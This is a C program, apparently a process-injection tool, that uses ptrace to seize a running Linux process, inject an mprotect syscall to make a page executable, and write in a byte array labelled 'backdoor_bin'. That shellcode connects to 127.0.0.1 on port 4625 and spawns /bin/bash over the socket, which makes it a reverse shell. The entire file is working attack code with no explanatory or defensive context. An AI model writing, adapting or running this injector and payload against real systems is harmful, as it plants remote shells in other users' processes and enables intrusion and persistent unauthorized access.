#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <sys/mman.h>

unsigned char backdoor_bin[] = {
  0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0xba, 0x06,
  0x00, 0x00, 0x00, 0x31, 0xc0, 0x04, 0x29, 0x0f, 0x05, 0x49, 0x89, 0xc0,
  0x4c, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x45, 0x00, 0x00, 0x00, 0x48, 0x83,
  0xc2, 0x0a, 0x31, 0xc0, 0x04, 0x2a, 0x0f, 0x05, 0x48, 0x31, 0xf6, 0xe8,
  0x2c, 0x00, 0x00, 0x00, 0x48, 0xff, 0xc6, 0xe8, 0x24, 0x00, 0x00, 0x00,
  0x48, 0xff, 0xc6, 0xe8, 0x1c, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0x24,
  0x00, 0x00, 0x00, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x31, 0xc0, 0x04,
  0x3b, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x31, 0xc0, 0x04, 0x3c, 0x0f, 0x05,
  0x31, 0xc0, 0x04, 0x21, 0x0f, 0x05, 0xc3, 0x02, 0x00, 0x12, 0x11, 0x7f,
  0x00, 0x00, 0x01, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68,
  0x00
};
unsigned int backdoor_bin_len = 121;


#define DIE(s) {perror(s); exit(1);}

int inject_syscall (pid_t pid, struct user_regs_struct *regs, uint64_t syscall,
		    uint64_t p1, uint64_t p2, uint64_t p3, uint64_t p4) {
  int status;
  
  regs->rax = syscall;
  regs->rdi = p1;
  regs->rsi = p2;
  regs->rdx = p3;
  regs->rcx = p4;

  if (ptrace (PTRACE_SETREGS,pid,0,regs) < 0)  DIE ("PTRACE_SETREGS:");
  if (ptrace (PTRACE_SINGLESTEP,pid,0,0) < 0)  DIE ("PTRACE_SINGLESTEP:");
  wait (&status);

  return status;
}


int main (int argc, char *argv[]) {
  struct user_regs_struct  regs, old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 addr = atol(argv[2]);
  struct iovec             local1[1], remote[1];
  uint64_t                 v, pagesize = sysconf (_SC_PAGESIZE);

  // --------------------------------------
  // Prepare to use process_vm_writev
  if (ptrace (PTRACE_SEIZE,     pid, 0, 0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT, pid, 0, 0) < 0) DIE ("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,   pid, 0, &old_regs) < 0)  DIE ("PTRACE_GETREGS:");

  memcpy (&regs, &old_regs, sizeof(regs));
  // We need to poke the syscall to change memory permissions at target
  if ((v = ptrace (PTRACE_PEEKTEXT, pid, regs.rip, 0)) < 0)  DIE ("PTRACE_PEEKTEXT:");
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  addr & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------
  local1[0].iov_base = backdoor_bin;
  local1[0].iov_len  = backdoor_bin_len;
 
  remote[0].iov_base = (void*) addr; // Copy just after syscall
  remote[0].iov_len  = backdoor_bin_len;
  process_vm_writev (pid, local1, 1, remote, 1, 0);

  if (ptrace (PTRACE_POKETEXT, pid, old_regs.rip, v) < 0)  DIE ("PTRACE_POKETEXT:");
  if (ptrace (PTRACE_SETREGS, pid, 0, &old_regs) < 0)  DIE ("PTRACE_SETREGS1:");
  // Let the tracee continue
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
}
